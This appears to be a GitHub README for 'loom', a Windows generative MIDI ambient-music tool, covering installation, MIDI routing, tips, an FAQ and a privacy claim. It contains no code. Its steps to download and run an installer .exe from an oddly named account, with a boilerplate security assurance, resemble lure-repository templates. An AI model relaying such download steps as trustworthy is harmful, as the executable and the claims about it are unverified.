# 🎹 loom - Create dark ambient soundscapes with ease

[![Download loom for Windows](https://img.shields.io/badge/Download-Loom%20for%20Windows-blue)](https://github.com/tyrothricinbeingness321/loom)

Loom generates evolving music soundscapes. It creates complex arrangements from a single starting point. You use this software to explore dark, atmospheric textures without manual composition. Loom utilizes generative MIDI protocols to produce patterns that shift over time. 

## 🛠 Prerequisites

Your computer requires the following setup to run the application:

*   Windows 10 or Windows 11 system.
*   A MIDI output device or a virtual MIDI driver.
*   At least 4GB of available RAM.
*   An installed Digital Audio Workstation (DAW) to receive MIDI signals.

## 📥 Installation Steps

1. Visit the [official loom download page](https://github.com/tyrothricinbeingness321/loom) to access the latest installer.
2. Locate the file ending in .exe in the assets list.
3. Click the file to start the download.
4. Open your Downloads folder on your computer.
5. Double-click the loom-installer.exe file to launch the setup wizard.
6. Follow the instructions on the screen.
7. Confirm that you give the application permission to install if Windows prompts you.

## 🚀 Getting Started

Launch loom from your Start Menu after installation. The interface shows a simple dashboard with a central seed input. 

1. Select your MIDI output device from the Settings menu.
2. Input a seed value or press the randomize button.
3. Press the Play button to start generation.
4. Adjust the density dial to change how often the music triggers notes.
5. Use the atmosphere slider to control the decay length of each sound.

## ⚙️ Configuring MIDI

Loom sends musical information to your DAW. You must route this signal to an instrument plugin.

1. Open your music production software.
2. Create a new MIDI track.
3. Set the input of the track to the Loom virtual MIDI port.
4. Load a virtual instrument onto the track.
5. Record or monitor the live output from the track.

## 💡 Usage Tips

*   Start with low density settings to hear how notes interact.
*   Use long-decay synthesizer presets for better background textures.
*   Save your seed values in a text file to revisit specific soundscapes later.
*   Increase the evolution rate if you want the music to change faster.

## 🔍 Frequently Asked Questions

**Why does the application require a DAW?**
Loom generates musical data, not audio files. It sends notes to your computer. Your DAW acts as the translator that turns those notes into actual sound.

**Does it create sound on its own?**
No. It functions as a MIDI controller. You need a synthesizer plugin inside your DAW to hear the output.

**What happens if I change the seed?**
The seed dictates the mathematical start of the arrangement. Changing it creates an entirely new musical path.

**How do I stop the music?**
Click the Stop button or close the application window.

**Can I run multiple instances?**
You can run multiple instances of the application on your computer. Ensure you select different MIDI channels for each instance in your settings.

**The output sounds distorted. What is wrong?**
Check your DAW mixing levels. MIDI-based generative instruments can create many simultaneous notes if settings are too high. Reduce the density parameter to lower the note count.

## 🛡 Security

Loom runs locally on your machine. The software does not track your data or transmit information over the internet. You possess full control over your files and settings. The application remains isolated from network requests to ensure your privacy during composition sessions.

## 🧩 Technical Overview

The engine relies on stochastic movement. It calculates note probabilities in real-time. The framework ensures that the MIDI output aligns with standard protocols. This allows for compatibility with any modern music production software. The core code focuses on stability and minimal CPU hardware usage.

Keywords: midi, generative, music, ambient, daw, automation, composition, windows